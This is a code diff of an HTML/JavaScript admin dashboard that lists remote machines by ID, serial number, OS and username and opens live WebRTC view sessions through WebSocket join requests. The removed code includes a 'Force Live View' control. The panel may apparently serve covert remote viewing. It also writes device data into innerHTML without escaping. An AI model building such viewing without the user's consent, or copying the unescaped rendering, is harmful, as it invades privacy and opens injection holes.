+            document.getElementById('connectingState').style.display = 'block';
+        }
 
- card.innerHTML = \`
- <strong>User ID: \${id}</strong><br>
- Serial: \${serial}<br>
- <span class="status-dot \${statusColor}"></span> Info: \${osInfo}<br>
- Last Seen: \${lastSeen}<br>
- <button class="btn \${btnClass}" onclick="joinUser('\${id}', '\${data.status}')">\${btnText}</button>
- <button class="btn btn-force" onclick="forceLiveView('\${id}')">📺 Force Live View</button>
- \`;
- grid.appendChild(card);
- }
- }
+        function renderUsers() {
+            const grid = document.getElementById('table-body');
+            grid.innerHTML = '';
+            
+            let total = Object.keys(users).length;
+            let online = 0;
+            let offline = 0;
+            let activeSessions = 0;
 
- function joinUser(id, status) {
- if (users[id] && users[id].signalingData) {
- const sigData = users[id].signalingData;
- ws.send(JSON.stringify({
- type: sigData.type,
- targetId: id,
- sdp: sigData.sdp,
- candidate: sigData.candidate
- }));
- addLog(\`[ADMIN] Resent \${sigData.type} to \${id}\`, 'green');
- } else {
- ws.send(JSON.stringify({
- type: 'request_join',
- targetId: id,
- from: null
- }));
- addLog(\`[ADMIN] Requested new join to \${id}\`, 'blue');
- }
+            for (const [id, data] of Object.entries(users)) {
+                if (data.status === 'Online') online++;
+                else offline++;
+                
+                if (data.sessionActive) activeSessions++;
 
- const card = document.querySelector(\`button[onclick="joinUser('\${id}', '\${status}')"]\`).parentElement;
- card.style.borderColor = '#4ade80';
- setTimeout(() => card.style.borderColor = '#3b82f6', 500);
- }
+                const card = document.createElement('div');
+                card.className = 'table-row';
+                card.onclick = () => openSession(id, data);
 
- function forceLiveView(id) {
- addLog(\`[FORCE] Forcing live view for \${id}\`, 'yellow');
- if (sessions[id]) {
- closeSession(id);
- }
- ws.send(JSON.stringify({
- type: 'request_join',
- targetId: id,
- from: null
- }));
- }
+                const osInfo = data.info ? \`\${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\` : 'Unknown OS';
+                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
 
- function forceLiveViewFromFrame() {
- const ids = Object.keys(sessions);
- if(ids.length > 0) {
- const lastId = ids[ids.length - 1];
- closeSession(lastId);
- ws.send(JSON.stringify({
- type: 'request_join',
- targetId: lastId,
- from: null
- }));
- }
- }
+                let statusColor = 'status-offline';
+                let btnText = 'Join Session';
+                let btnClass = '';
 
- function closeVideo() {
- document.getElementById('videoModal').style.display = 'none';
- Object.keys(sessions).forEach(sid => closeSession(sid));
- remoteVideo.srcObject = null;
- }
- </script>
+                if (data.status === 'Online') {
+                    statusColor = 'status-online';
+                    if (data.sessionActive) {
+                        btnText = 'Reconnect Session';
+                        btnClass = 'active';
+                    }
+                } else if (data.status === 'Connecting...') {
+                    statusColor = 'status-connecting';
+                    btnText = 'Connecting...';
+                }
+
+                card.innerHTML = \`
+                    <div class="custom-checkbox" onclick="event.stopPropagation(); this.classList.toggle('checked');"></div>
+                    <div class="machine-info">
+                        <span class="name"><i class="fa-solid fa-laptop"></i> \${id}</span>
+                        <span class="company">\${data.serialNumber || 'N/A'}</span>
+                    </div>
+                    <div style="color: var(--text-muted); font-size: 0.9rem;">\${osInfo}</div>
+                    <div class="status">
+                        <div class="status-dot \${statusColor}"></div> \${data.status}
+                    </div>
+                `;
+                grid.appendChild(card);
+            }
+
+            document.getElementById('totalUsers').innerText = total;
+            document.getElementById('onlineUsers').innerText = online;
+            document.getElementById('offlineUsers').innerText = offline;
+            document.getElementById('activeSessions').innerText = activeSessions;
+        }
+
+        function openSession(machineId, data) {
+            document.getElementById('modalMachineName').innerText = \`\${machineId} - \${data.serialNumber}\`;
+            document.getElementById('connectingState').style.display = 'block';
+            document.getElementById('sessionModal').classList.add('active');
+            
+            // Request join
+            ws.send(JSON.stringify({
+                type: 'request_join',
+                targetId: machineId,
+                from: null
+            }));
+        }
+
+        function openNewSession() {
+            // Placeholder for new session creation
+            alert("New Session functionality would go here.");
+        }
+
+        function filterTable() {
+            const input = document.getElementById('searchInput');
+            const filter = input.value.toLowerCase();
+            const rows = document.querySelectorAll('.table-row');
+
+            rows.forEach(row => {
+                const text = row.innerText.toLowerCase();
+                row.style.display = text.includes(filter) ? '' : 'none';
+            });
+        }
+    </script>
 </body>
 </html>
 `;
